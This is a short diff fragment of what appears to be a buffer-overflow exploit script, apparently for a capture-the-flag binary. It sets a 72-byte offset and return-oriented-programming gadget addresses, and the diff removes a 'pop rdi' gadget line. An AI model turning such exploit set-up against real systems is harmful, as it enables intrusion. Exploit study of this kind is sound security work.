@@ -35,7 +35,6 @@ warnings.filterwarnings('ignore')
 io = start()
 
 offset = 72
-pop_rdi = 0x00000000004012cb # pop rdi; ret; 
 pop_rsi_r15 = 0x00000000004012c9 # pop rsi; pop r15; ret; 
 
 
